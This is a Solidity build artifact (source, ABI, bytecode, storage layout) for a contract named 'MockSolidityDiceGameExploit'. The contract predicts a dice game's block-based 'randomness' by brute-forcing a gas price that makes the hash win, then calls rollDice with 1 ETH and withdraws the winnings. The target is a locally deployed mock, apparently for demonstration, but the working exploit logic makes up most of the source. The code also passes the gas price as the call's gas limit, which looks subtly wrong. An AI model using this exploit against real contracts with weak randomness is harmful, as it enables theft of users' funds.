{
  "contractName": "MockSolidityDiceGameExploit",
  "compilerVersion": "v0.8.28+commit.7893614a",
  "contractSource": "contracts/MockSolidityDiceGameExploit/MockSolidityDiceGameExploit.sol",
  "compilerInput": {
    "language": "Solidity",
    "sources": {
      "MockSolidityDiceGameExploit.sol": {
        "content": "// SPDX-License-Identifier: MIT\r\npragma solidity 0.8.28;\r\n\r\nimport \"./IMockSolidityDiceGame.sol\";\r\nimport \"./MockSolidityDiceGame.sol\";\r\nimport \"./Ownable.sol\";\r\n\r\nstruct HashInputs {\r\n    address msgSender;\r\n    address txOrigin;\r\n    uint256 blockTimestamp;\r\n    uint256 txGasPrice;\r\n    bytes32 blockHash;\r\n}\r\n\r\n// This contract is used to exploit the \"rollDice()\" function in the MockSolidityDiceGame contract by finding the lowest viable gasPrice\r\n// satisfying the win condition (above the block baseFee) using a VM fork of the Ethereum mainnet and then executing the winning dice roll \r\n// via a backend Hardhat/ethers.js script by calling the \"rollDice()\" function in the MockSolidityDiceGame contract with the winning inputs.\r\ncontract MockSolidityDiceGameExploit is Ownable {\r\n    event DiceRollEvent(bool, uint256, HashInputs);\r\n    event GasPriceRange(uint256 minGasPrice, uint256 maxGasPrice);\r\n\r\n    constructor() payable {\r\n        // Created a mock Solidity dice game contract here for demonstration in local VM simulation, giving it a 10 ETH balance.\r\n        MockSolidityDiceGameAddress = address(\r\n            new MockSolidityDiceGame{value: 10 ether}()\r\n        );\r\n        RDG = IMockSolidityDiceGame(MockSolidityDiceGameAddress);\r\n    }\r\n\r\n    address public immutable MockSolidityDiceGameAddress;\r\n    IMockSolidityDiceGame private immutable RDG;\r\n    HashInputs private storedHashInputs;\r\n\r\n    function retrieveStoredHashInputs() external onlyOwner view returns (HashInputs memory) {\r\n        return storedHashInputs;\r\n    }\r\n\r\n    // This function is used to test the deterministic hash result of the \"rollDice()\" function in the MockSolidityDiceGame contract\r\n    // whilst searching for the lowest gasPrice (above the current network gas price) satisfying the win condition and assigns the\r\n    // storedHashInputs variable with the winning inputs.\r\n    function testDeterministicHashResult()\r\n        external\r\n        onlyOwner\r\n        returns (HashInputs memory winningInputs)\r\n    {\r\n        // Get current network gas price and add buffer\r\n        uint256 currentGasPrice = block.basefee; // available since EIP-1559\r\n        uint256 minGasPriceWei = currentGasPrice >= 2e9 ? currentGasPrice * 12 / 10 : 2e9; // Add 20% buffer or 2 Gwei minimum\r\n        uint256 maxGasPriceWei = 100e9; // Cap at 100 Gwei\r\n\r\n        // Log the gas price range we're searching\r\n        emit GasPriceRange(minGasPriceWei, maxGasPriceWei);\r\n\r\n        // Increment the gas price as \"i\" by 0.1 Gwei (1e8) per iteration in a for loop\r\n        for (uint256 i = minGasPriceWei; i < maxGasPriceWei; i += 1e8) {\r\n            address msgSender = address(this); // Use address of this contract because it will become msg.sender when calling RDG.rollDice()\r\n            address txOrigin = tx.origin; // tx.origin could also be manipulated by the caller by using different EOA.\r\n            uint256 blockTimestamp = block.timestamp + 12; // Add 12 seconds to the block timestamp anticipating the block being finalized\r\n            bytes32 previousBlockHash = blockhash(block.number - 1); // Use the previous block hash (current block hash unavailable)\r\n\r\n            // Calculate the keccak256 hash result (as a uint256) for the current iteration\r\n            uint256 hashUint = uint256(\r\n                keccak256(\r\n                    abi.encode(\r\n                        msgSender,\r\n                        txOrigin,\r\n                        blockTimestamp,\r\n                        i, // \"i\" is the incremented gasPrice\r\n                        previousBlockHash\r\n                    )\r\n                )\r\n            );\r\n\r\n            // Check if the hash result satisfies the win condition of the \"rollDice()\" function\r\n            // There are actually many winning hashes for this condition (i.e. when \"hashUint / 6\" has a remainder of \"5\")\r\n            // but here we calculate the lowest gasPrice >= currentGasPrice satisfying the condition\r\n            if (hashUint % 6 == 5) {\r\n                winningInputs = HashInputs({\r\n                    msgSender: msgSender,\r\n                    txOrigin: txOrigin,\r\n                    blockTimestamp: blockTimestamp,\r\n                    txGasPrice: i,\r\n                    blockHash: previousBlockHash\r\n                });\r\n                storedHashInputs = winningInputs;\r\n                return winningInputs;\r\n            }\r\n            // Returns the struct with uninitialized values if no winning combination is found.\r\n        }\r\n    }\r\n\r\n    // This function is used to execute the winning dice roll by calling the \"rollDice()\" function in the MockSolidityDiceGame contract\r\n    // with the winning inputs passed in as calldata from the backend JavaScript script whilst sending the required 1 ETH to the contract.\r\n    // This contract will become the msg.sender when calling RDG.rollDice() function.\r\n    function executeWinningDiceRoll(HashInputs calldata hashInputs)\r\n        external\r\n        payable\r\n        onlyOwner\r\n        returns (\r\n            bool success,\r\n            uint256 txGasPrice\r\n        )\r\n    {\r\n        uint256 balanceBefore = address(this).balance;\r\n        // This contract will become the msg.sender when calling RDG.rollDice() function.\r\n        try RDG.rollDice{gas: hashInputs.txGasPrice, value: 1 ether}() {\r\n            // Confirm the balance change (increase) in this contract\r\n            if (address(this).balance > balanceBefore) {\r\n                emit DiceRollEvent(true, txGasPrice, hashInputs);\r\n                return (true, txGasPrice);\r\n            }\r\n        } catch {\r\n            emit DiceRollEvent(false, txGasPrice, hashInputs);\r\n        }\r\n        return (false, txGasPrice);\r\n    }\r\n\r\n    function getEthBalance() external view returns (uint256) {\r\n        return address(this).balance;\r\n    }\r\n\r\n    function withdrawEth(address payable to)\r\n        external\r\n        onlyOwner\r\n        returns (bool success)\r\n    {\r\n        (success, ) = to.call{value: address(this).balance}(\"\");\r\n        require(success, \"ETH transfer failed\");\r\n    }\r\n\r\n    receive() external payable {}\r\n}\r\n"
      }
    },
    "settings": {
      "outputSelection": {
        "MockSolidityDiceGameExploit.sol": {
          "MockSolidityDiceGameExploit": [
            "abi",
            "evm.bytecode.object",
            "evm.deployedBytecode.object",
            "evm.deployedBytecode.immutableReferences"
          ],
          "": [
            "ast"
          ]
        },
        "*": {
          "*": [
            "storageLayout"
          ]
        }
      },
      "optimizer": {
        "enabled": true,
        "runs": 200
      }
    }
  },
  "abi": [
    {
      "inputs": [],
      "stateMutability": "payable",
      "type": "constructor"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "internalType": "bool",
          "name": "",
          "type": "bool"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        },
        {
          "components": [
            {
              "internalType": "address",
              "name": "msgSender",
              "type": "address"
            },
            {
              "internalType": "address",
              "name": "txOrigin",
              "type": "address"
            },
            {
              "internalType": "uint256",
              "name": "blockTimestamp",
              "type": "uint256"
            },
            {
              "internalType": "uint256",
              "name": "txGasPrice",
              "type": "uint256"
            },
            {
              "internalType": "bytes32",
              "name": "blockHash",
              "type": "bytes32"
            }
          ],
          "indexed": false,
          "internalType": "struct HashInputs",
          "name": "",
          "type": "tuple"
        }
      ],
      "name": "DiceRollEvent",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "minGasPrice",
          "type": "uint256"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "maxGasPrice",
          "type": "uint256"
        }
      ],
      "name": "GasPriceRange",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "previousOwner",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "newOwner",
          "type": "address"
        }
      ],
      "name": "OwnershipTransferred",
      "type": "event"
    },
    {
      "inputs": [],
      "name": "MockSolidityDiceGameAddress",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "components": [
            {
              "internalType": "address",
              "name": "msgSender",
              "type": "address"
            },
            {
              "internalType": "address",
              "name": "txOrigin",
              "type": "address"
            },
            {
              "internalType": "uint256",
              "name": "blockTimestamp",
              "type": "uint256"
            },
            {
              "internalType": "uint256",
              "name": "txGasPrice",
              "type": "uint256"
            },
            {
              "internalType": "bytes32",
              "name": "blockHash",
              "type": "bytes32"
            }
          ],
          "internalType": "struct HashInputs",
          "name": "hashInputs",
          "type": "tuple"
        }
      ],
      "name": "executeWinningDiceRoll",
      "outputs": [
        {
          "internalType": "bool",
          "name": "success",
          "type": "bool"
        },
        {
          "internalType": "uint256",
          "name": "txGasPrice",
          "type": "uint256"
        }
      ],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "getEthBalance",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "owner",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "renounceOwnership",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "retrieveStoredHashInputs",
      "outputs": [
        {
          "components": [
            {
              "internalType": "address",
              "name": "msgSender",
              "type": "address"
            },
            {
              "internalType": "address",
              "name": "txOrigin",
              "type": "address"
            },
            {
              "internalType": "uint256",
              "name": "blockTimestamp",
              "type": "uint256"
            },
            {
              "internalType": "uint256",
              "name": "txGasPrice",
              "type": "uint256"
            },
            {
              "internalType": "bytes32",
              "name": "blockHash",
              "type": "bytes32"
            }
          ],
          "internalType": "struct HashInputs",
          "name": "",
          "type": "tuple"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "testDeterministicHashResult",
      "outputs": [
        {
          "components": [
            {
              "internalType": "address",
              "name": "msgSender",
              "type": "address"
            },
            {
              "internalType": "address",
              "name": "txOrigin",
              "type": "address"
            },
            {
              "internalType": "uint256",
              "name": "blockTimestamp",
              "type": "uint256"
            },
            {
              "internalType": "uint256",
              "name": "txGasPrice",
              "type": "uint256"
            },
            {
              "internalType": "bytes32",
              "name": "blockHash",
              "type": "bytes32"
            }
          ],
          "internalType": "struct HashInputs",
          "name": "winningInputs",
          "type": "tuple"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "newOwner",
          "type": "address"
        }
      ],
      "name": "transferOwnership",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address payable",
          "name": "to",
          "type": "address"
        }
      ],
      "name": "withdrawEth",
      "outputs": [
        {
          "internalType": "bool",
          "name": "success",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    }
  ],
  "constructorArgs": [],
  "bytecode": "60c060405261000d33610054565b678ac7230489e80000604051610022906100a3565b6040518091039082f090508015801561003d573d5f5f3e3d5ffd5b506001600160a01b0316608081905260a0526100b0565b5f80546001600160a01b038381166001600160a01b0319831681178455604051919092169283917f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e09190a35050565b6101ca8061099d83390190565b60805160a0516108cd6100d05f395f6104d801525f60a301526108cd5ff3fe608060405260043610610087575f3560e01c806370ed0ada1161005757806370ed0ada14610184578063715018a61461019e5780638da5cb5b146101b4578063e029413c146101d0578063f2fde38b146101fa575f5ffd5b80632595ee141461009257806325e16063146100e257806333d414911461011157806369e91d1114610170575f5ffd5b3661008e57005b5f5ffd5b34801561009d575f5ffd5b506100c57f000000000000000000000000000000000000000000000000000000000000000081565b6040516001600160a01b0390911681526020015b60405180910390f35b3480156100ed575f5ffd5b506101016100fc36600461075b565b610219565b60405190151581526020016100d9565b34801561011c575f5ffd5b506101256102c0565b6040516100d9919081516001600160a01b0390811682526020808401519091169082015260408083015190820152606080830151908201526080918201519181019190915260a00190565b34801561017b575f5ffd5b50610125610464565b34801561018f575f5ffd5b506040514781526020016100d9565b3480156101a9575f5ffd5b506101b26104b5565b005b3480156101bf575f5ffd5b505f546001600160a01b03166100c5565b6101e36101de36600461077d565b6104c8565b6040805192151583526020830191909152016100d9565b348015610205575f5ffd5b506101b261021436600461075b565b6105ea565b5f610222610663565b6040516001600160a01b0383169047905f81818185875af1925050503d805f8114610268576040519150601f19603f3d011682016040523d82523d5f602084013e61026d565b606091505b505080915050806102bb5760405162461bcd60e51b8152602060048201526013602482015272115512081d1c985b9cd9995c8819985a5b1959606a1b60448201526064015b60405180910390fd5b919050565b6102c861070b565b6102d0610663565b485f63773594008210156102e85763773594006102ff565b600a6102f583600c6107aa565b6102ff91906107db565b6040805182815264174876e800602082018190529293507f0a6c943f5a72900efb859cd19d4cda1d5b4b09d115cb15d816f08ecd0f29e345910160405180910390a1815b8181101561045c5730325f61035942600c6107ee565b90505f610367600143610801565b604080516001600160a01b0380881660208301528616918101919091526060810184905260808101879052904060a0820181905291505f9060c00160408051601f19818403018152919052805160209091012090506103c7600682610814565b60050361044057506040805160a0810182526001600160a01b0395861680825294909516602086018190529085018390526060850186905260808501829052600180546001600160a01b031990811690951790556002805490941617909255600355600492909255600591909155935061046192505050565b50505050506305f5e1008161045591906107ee565b9050610343565b505050505b90565b61046c61070b565b610474610663565b506040805160a0810182526001546001600160a01b039081168252600254166020820152600354918101919091526004546060820152600554608082015290565b6104bd610663565b6104c65f6106bc565b565b5f5f6104d2610663565b5f4790507f00000000000000000000000000000000000000000000000000000000000000006001600160a01b031663837e7cc68560600135670de0b6b3a76400006040518363ffffffff1660e01b81526004015f604051808303818589803b15801561053c575f5ffd5b5088f1945050505050801561054f575060015b610593577f42618a4d1204e2d9d5337a99a3f0092edc874124860887f026a36fd8845b55e35f838660405161058693929190610827565b60405180910390a16105e1565b804711156105e1577f42618a4d1204e2d9d5337a99a3f0092edc874124860887f026a36fd8845b55e3600183866040516105cf93929190610827565b60405180910390a16001925050915091565b5f925050915091565b6105f2610663565b6001600160a01b0381166106575760405162461bcd60e51b815260206004820152602660248201527f4f776e61626c653a206e6577206f776e657220697320746865207a65726f206160448201526564647265737360d01b60648201526084016102b2565b610660816106bc565b50565b5f546001600160a01b031633146104c65760405162461bcd60e51b815260206004820181905260248201527f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e657260448201526064016102b2565b5f80546001600160a01b038381166001600160a01b0319831681178455604051919092169283917f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e09190a35050565b6040518060a001604052805f6001600160a01b031681526020015f6001600160a01b031681526020015f81526020015f81526020015f81525090565b6001600160a01b0381168114610660575f5ffd5b5f6020828403121561076b575f5ffd5b813561077681610747565b9392505050565b5f60a082840312801561078e575f5ffd5b509092915050565b634e487b7160e01b5f52601160045260245ffd5b80820281158282048414176107c1576107c1610796565b92915050565b634e487b7160e01b5f52601260045260245ffd5b5f826107e9576107e96107c7565b500490565b808201808211156107c1576107c1610796565b818103818111156107c1576107c1610796565b5f82610822576108226107c7565b500690565b83151581526020810183905260e08101823561084281610747565b6001600160a01b03166040830152602083013561085e81610747565b6001600160a01b031660608381019190915260408401356080808501919091529084013560a08401529092013560c0909101529291505056fea2646970667358221220f37b9ab3cb83ee193b6ffcdf0bd04124013798127b89882eb87aab598ed83daf64736f6c634300081c003360806040526101b9806100115f395ff3fe60806040526004361061002b575f3560e01c806370ed0ada14610036578063837e7cc614610055575f5ffd5b3661003257005b5f5ffd5b348015610041575f5ffd5b504760405190815260200160405180910390f35b61005d61005f565b005b34670de0b6b3a764000014610072575f5ffd5b600661007c6100dd565b610086919061013f565b6005036100db576040513390671bc16d674ec80000905f81818185875af1925050503d805f81146100d2576040519150601f19603f3d011682016040523d82523d5f602084013e6100d7565b606091505b5050505b565b5f3332423a6100ed60014361015e565b604080516001600160a01b0396871660208201529590941693850193909352606084019190915260808301524060a082015260c001604051602081830303815290604052805190602001205f1c905090565b5f8261015957634e487b7160e01b5f52601260045260245ffd5b500690565b8181038181111561017d57634e487b7160e01b5f52601160045260245ffd5b9291505056fea26469706673582212206f14775d8359aececa24320afa4f5e9865d327b438ac825f29230f25da8c162e64736f6c634300081c0033",
  "deployedBytecode": "608060405260043610610087575f3560e01c806370ed0ada1161005757806370ed0ada14610184578063715018a61461019e5780638da5cb5b146101b4578063e029413c146101d0578063f2fde38b146101fa575f5ffd5b80632595ee141461009257806325e16063146100e257806333d414911461011157806369e91d1114610170575f5ffd5b3661008e57005b5f5ffd5b34801561009d575f5ffd5b506100c57f000000000000000000000000000000000000000000000000000000000000000081565b6040516001600160a01b0390911681526020015b60405180910390f35b3480156100ed575f5ffd5b506101016100fc36600461075b565b610219565b60405190151581526020016100d9565b34801561011c575f5ffd5b506101256102c0565b6040516100d9919081516001600160a01b0390811682526020808401519091169082015260408083015190820152606080830151908201526080918201519181019190915260a00190565b34801561017b575f5ffd5b50610125610464565b34801561018f575f5ffd5b506040514781526020016100d9565b3480156101a9575f5ffd5b506101b26104b5565b005b3480156101bf575f5ffd5b505f546001600160a01b03166100c5565b6101e36101de36600461077d565b6104c8565b6040805192151583526020830191909152016100d9565b348015610205575f5ffd5b506101b261021436600461075b565b6105ea565b5f610222610663565b6040516001600160a01b0383169047905f81818185875af1925050503d805f8114610268576040519150601f19603f3d011682016040523d82523d5f602084013e61026d565b606091505b505080915050806102bb5760405162461bcd60e51b8152602060048201526013602482015272115512081d1c985b9cd9995c8819985a5b1959606a1b60448201526064015b60405180910390fd5b919050565b6102c861070b565b6102d0610663565b485f63773594008210156102e85763773594006102ff565b600a6102f583600c6107aa565b6102ff91906107db565b6040805182815264174876e800602082018190529293507f0a6c943f5a72900efb859cd19d4cda1d5b4b09d115cb15d816f08ecd0f29e345910160405180910390a1815b8181101561045c5730325f61035942600c6107ee565b90505f610367600143610801565b604080516001600160a01b0380881660208301528616918101919091526060810184905260808101879052904060a0820181905291505f9060c00160408051601f19818403018152919052805160209091012090506103c7600682610814565b60050361044057506040805160a0810182526001600160a01b0395861680825294909516602086018190529085018390526060850186905260808501829052600180546001600160a01b031990811690951790556002805490941617909255600355600492909255600591909155935061046192505050565b50505050506305f5e1008161045591906107ee565b9050610343565b505050505b90565b61046c61070b565b610474610663565b506040805160a0810182526001546001600160a01b039081168252600254166020820152600354918101919091526004546060820152600554608082015290565b6104bd610663565b6104c65f6106bc565b565b5f5f6104d2610663565b5f4790507f00000000000000000000000000000000000000000000000000000000000000006001600160a01b031663837e7cc68560600135670de0b6b3a76400006040518363ffffffff1660e01b81526004015f604051808303818589803b15801561053c575f5ffd5b5088f1945050505050801561054f575060015b610593577f42618a4d1204e2d9d5337a99a3f0092edc874124860887f026a36fd8845b55e35f838660405161058693929190610827565b60405180910390a16105e1565b804711156105e1577f42618a4d1204e2d9d5337a99a3f0092edc874124860887f026a36fd8845b55e3600183866040516105cf93929190610827565b60405180910390a16001925050915091565b5f925050915091565b6105f2610663565b6001600160a01b0381166106575760405162461bcd60e51b815260206004820152602660248201527f4f776e61626c653a206e6577206f776e657220697320746865207a65726f206160448201526564647265737360d01b60648201526084016102b2565b610660816106bc565b50565b5f546001600160a01b031633146104c65760405162461bcd60e51b815260206004820181905260248201527f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e657260448201526064016102b2565b5f80546001600160a01b038381166001600160a01b0319831681178455604051919092169283917f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e09190a35050565b6040518060a001604052805f6001600160a01b031681526020015f6001600160a01b031681526020015f81526020015f81526020015f81525090565b6001600160a01b0381168114610660575f5ffd5b5f6020828403121561076b575f5ffd5b813561077681610747565b9392505050565b5f60a082840312801561078e575f5ffd5b509092915050565b634e487b7160e01b5f52601160045260245ffd5b80820281158282048414176107c1576107c1610796565b92915050565b634e487b7160e01b5f52601260045260245ffd5b5f826107e9576107e96107c7565b500490565b808201808211156107c1576107c1610796565b818103818111156107c1576107c1610796565b5f82610822576108226107c7565b500690565b83151581526020810183905260e08101823561084281610747565b6001600160a01b03166040830152602083013561085e81610747565b6001600160a01b031660608381019190915260408401356080808501919091529084013560a08401529092013560c0909101529291505056fea2646970667358221220f37b9ab3cb83ee193b6ffcdf0bd04124013798127b89882eb87aab598ed83daf64736f6c634300081c0033",
  "storageLayout": {
    "storage": [
      {
        "astId": 398,
        "contract": "MockSolidityDiceGameExploit.sol:MockSolidityDiceGameExploit",
        "label": "_owner",
        "offset": 0,
        "slot": "0",
        "type": "t_address"
      },
      {
        "astId": 62,
        "contract": "MockSolidityDiceGameExploit.sol:MockSolidityDiceGameExploit",
        "label": "storedHashInputs",
        "offset": 0,
        "slot": "1",
        "type": "t_struct(HashInputs)15_storage"
      }
    ],
    "types": {
      "t_address": {
        "encoding": "inplace",
        "label": "address",
        "numberOfBytes": "20"
      },
      "t_bytes32": {
        "encoding": "inplace",
        "label": "bytes32",
        "numberOfBytes": "32"
      },
      "t_struct(HashInputs)15_storage": {
        "encoding": "inplace",
        "label": "struct HashInputs",
        "members": [
          {
            "astId": 6,
            "contract": "MockSolidityDiceGameExploit.sol:MockSolidityDiceGameExploit",
            "label": "msgSender",
            "offset": 0,
            "slot": "0",
            "type": "t_address"
          },
          {
            "astId": 8,
            "contract": "MockSolidityDiceGameExploit.sol:MockSolidityDiceGameExploit",
            "label": "txOrigin",
            "offset": 0,
            "slot": "1",
            "type": "t_address"
          },
          {
            "astId": 10,
            "contract": "MockSolidityDiceGameExploit.sol:MockSolidityDiceGameExploit",
            "label": "blockTimestamp",
            "offset": 0,
            "slot": "2",
            "type": "t_uint256"
          },
          {
            "astId": 12,
            "contract": "MockSolidityDiceGameExploit.sol:MockSolidityDiceGameExploit",
            "label": "txGasPrice",
            "offset": 0,
            "slot": "3",
            "type": "t_uint256"
          },
          {
            "astId": 14,
            "contract": "MockSolidityDiceGameExploit.sol:MockSolidityDiceGameExploit",
            "label": "blockHash",
            "offset": 0,
            "slot": "4",
            "type": "t_bytes32"
          }
        ],
        "numberOfBytes": "160"
      },
      "t_uint256": {
        "encoding": "inplace",
        "label": "uint256",
        "numberOfBytes": "32"
      }
    }
  },
  "immutableReferences": {
    "56": [
      {
        "length": 32,
        "start": 163
      }
    ],
    "59": [
      {
        "length": 32,
        "start": 1240
      }
    ]
  }
}